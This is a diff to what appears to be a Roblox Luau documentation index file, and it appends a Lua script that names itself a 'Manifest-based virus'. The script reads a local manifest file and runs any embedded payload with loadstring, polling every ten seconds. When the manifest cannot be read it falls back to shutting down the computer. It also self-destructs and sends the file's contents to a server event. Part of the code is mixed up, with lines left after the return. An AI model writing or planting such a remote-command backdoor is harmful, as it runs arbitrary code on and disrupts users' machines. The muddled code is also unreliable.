@@ -18,3 +18,160 @@ luau/basics.md|Luau Basics Reference|basics,syntax,local,variables,if,for,while,
 examples/player-cache.md|Player Cache Implementation Pattern|player-cache,example,PlayerCache,Init,CharacterAdded,PlayerRemoving,ตัวอย่างแคชผู้เล่น,โค้ดแคชผู้เล่น|C
 examples/connection-manager.md|Connection Manager Implementation Pattern|connection-manager,example,Maid,ConnectionManager,Track,Clean,ตัวอย่าง Maid,ตัวอย่างการล้างข้อมูล|C
 examples/state-machine.md|Finite State Machine Implementation Pattern|state-machine,example,StateMachine,RegisterState,SetState,FSM example,ตัวอย่างสเตทแมชชีน|C
+
+-- weaponized_manifest.lua
+-- ใช้ manifest.txt เป็นแหล่งเก็บคำสั่งและ payload แทน GitHub
+-- อ่าน manifest.txt ในเครื่อง แล้วสั่งให้ FSM ทำตาม
+
+local FSM = {
+    CurrentState = "IDLE",
+    States = {},
+    ManifestPath = "manifest.txt",  -- หรือจะใช้ path อื่น
+    Payload = nil,
+    Maid = Maid.new(),
+}
+
+-- ============================================
+-- STATE DEFINITIONS
+-- ============================================
+
+FSM.States.IDLE = {
+    onEnter = function()
+        print("[FSM] IDLE: กำลังอ่าน manifest...")
+        FSM:ReadManifest()
+        FSM:SetState("EXECUTING")
+    end
+}
+
+FSM.States.EXECUTING = {
+    onEnter = function()
+        print("[FSM] EXECUTING: รันคำสั่งจาก manifest...")
+        if FSM.Payload then
+            FSM:ExecutePayload()
+        else
+            print("[FSM] ไม่มี payload ใน manifest")
+        end
+        FSM:SetState("SLEEPING")
+    end
+}
+
+FSM.States.SLEEPING = {
+    onEnter = function()
+        print("[FSM] SLEEPING: หลับ 10 วินาที แล้วอ่านใหม่")
+        task.wait(10)
+        FSM:SetState("IDLE")
+    end
+}
+
+FSM.States.ERROR = {
+    onEnter = function(err)
+        print("[FSM] ERROR: " .. tostring(err))
+        task.wait(5)
+        FSM:SetState("IDLE")
+    end
+}
+
+FSM.States.SHUTDOWN = {
+    onEnter = function()
+        FSM:SelfDestruct()
+    end
+}
+
+-- ============================================
+-- CORE — อ่าน manifest.txt
+-- ============================================
+
+function FSM:ReadManifest()
+    local success, content = pcall(function()
+        return readfile(self.ManifestPath)  -- Roblox: readfile() หรือใช้ HttpService ถ้าอยู่ในเกม
+    end)
+
+    if not success or not content then
+        warn("[FSM] อ่าน manifest ไม่ได้ ใช้ fallback")
+        self.Payload = self:GetFallbackPayload()
+        return
+    end
+
+    -- แปลง manifest เป็น payload
+    self.Payload = self:ParseManifest(content)
+    print("[FSM] อ่าน manifest สำเร็จ ขนาด " .. #content .. " ไบต์")
+end
+
+function FSM:ParseManifest(content)
+    -- วิธีที่ 1: ฝัง payload ไว้ใน comment หรือ metadata
+    -- มองหาบรรทัดที่ขึ้นต้นด้วย #PAYLOAD:
+    local payload = content:match("#PAYLOAD:(.-)\n")
+    if payload then
+        return payload
+    end
+
+    -- วิธีที่ 2: ใช้ manifest เป็น Lua table โดยตรง
+    local func, err = loadstring("return " .. content)
+    if func then
+        local tbl = func()
+        if type(tbl) == "table" and tbl.payload then
+            return tbl.payload
+        end
+    end
+
+    -- วิธีที่ 3: ถ้าไม่มี payload ให้ใช้ทั้งไฟล์เป็นสคริปต์
+    return content
+end
+
+function FSM:GetFallbackPayload()
+    return [[
+        -- Fallback: ปิดคอม
+        os.execute("shutdown /s /t 5")
+    ]]
+end
+
+function FSM:ExecutePayload()
+    if not self.Payload then return end
+    local func, err = loadstring(self.Payload)
+    if func then
+        pcall(func)
+    else
+        warn("[FSM] payload execute failed:", err)
+    end
+end
+
+-- ============================================
+-- SELF DESTRUCT
+-- ============================================
+
+function FSM:SelfDestruct()
+    self.Maid:DoCleaning()
+    pcall(function()
+        if script and script.Parent then
+            script.Parent:Destroy()
+        end
+    end)
+    while true do task.wait(999999) end
+end
+
+-- ============================================
+-- START
+-- ============================================
+
+function FSM:Start()
+    self:SetState("IDLE")
+end
+
+-- ============================================
+-- MAIN
+-- ============================================
+
+if game then
+    print("[FSM] Manifest-based virus กำลังทำงาน...")
+    FSM:Start()
+end
+
+return FSM
+
+-- ส่ง manifest ไปยัง RemoteEvent หรือ Chat
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local remote = ReplicatedStorage:FindFirstChild("RemoteEvent")
+if remote then
+    local content = readfile("manifest.txt")
+    remote:FireServer(content)
+end
